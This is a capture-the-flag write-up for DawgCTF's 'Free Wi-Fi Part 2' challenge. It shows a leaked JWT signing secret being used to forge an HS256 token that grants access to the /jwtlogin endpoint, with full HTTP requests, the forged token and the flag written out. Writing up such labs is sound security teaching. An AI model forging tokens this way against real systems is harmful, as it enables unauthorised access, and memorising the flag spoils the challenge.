## Free Wi-Fi Part 2

* **Category:** web/networking
* **Points:** 300

### Challenge

> I saw someone's screen and it looked like they stayed logged in, somehow...
> 
> http://freewifi.ctf.umbccd.io/
> 
> Authors: pleoxconfusa and freethepockets

### Solution

At this point, you can spot two interesting cookies:
* `JWT 'identity'=31337`;
* `JWT 'secret'="dawgCTF?heckin#bamboozle"`.

Analyzing the capture, you can find two packets, #261 and #263, regarding a JWT-related endpoint.

```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: WifiKey nonce=MjAyMC0wNC0wOCAxNzowMg==; session=eyJjc3JmX3Rva2VuIjoiYTg4ZWQxZjVkODhhZTgyZDEzMWY4ODhmZWExZjYwNDRmNTEwMDgyMCJ9.Xo35dQ.zpNEVjf6uG_5vhqwNCE7bS8QEz0
Connection: keep-alive
Upgrade-Insecure-Requests: 1

HTTP/1.0 401 UNAUTHORIZED
Content-Type: application/json
Content-Length: 125
WWW-Authenticate: JWT realm="Login Required"
Server: Werkzeug/1.0.1 Python/3.6.9
Date: Wed, 08 Apr 2020 17:02:35 GMT

{
  "description": "Request does not contain an access token", 
  "error": "Authorization Required", 
  "status_code": 401
}
```

You can use [JWT.io website](https://jwt.io/) to craft a valid JWT with `31337` identity and signed with `dawgCTF?heckin#bamboozle` secret.

```
{"alg":"HS256","typ":"JWT"}.{"identity":31337,"iat":1586564945,"nbf":1586564945,"exp":1586908800}.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsImlhdCI6MTU4NjU2NDk0NSwibmJmIjoxNTg2NTY0OTQ1LCJleHAiOjE1ODY5MDg4MDB9.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE
```

Calling the endpoint with the JWT in the `Authorization` header will give you the flag.

```
GET /jwtlogin HTTP/1.1
Host: freewifi.ctf.umbccd.io
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Cookie: WifiKey nonce=MjAyMC0wNC0xMSAwMDoxNg==; WifiKey alg=SHA1; session=eyJjc3JmX3Rva2VuIjoiYTA2MmZkNTUyNzM3NmQwMTAxYTc4YzgwMmFlNmFkOTI5ZGQzNzU3OCJ9.XpD3NA.zDj47SdpKQnikt--V9WnN0zUmYQ; JWT 'identity'=31337; JWT 'secret'="dawgCTF?heckin#bamboozle"
Authorization: JWT eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZGVudGl0eSI6MzEzMzcsImlhdCI6MTU4NjU2NDk0NSwibmJmIjoxNTg2NTY0OTQ1LCJleHAiOjE1ODY5MDg4MDB9.Hx0gLrzRZy4lGdEhvV_eIpdpSSa_pd6FQVBy1pMVNPE
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 11 Apr 2020 00:35:23 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 27

DawgCTF{y0u_d0wn_w!t#_JWT?}
```
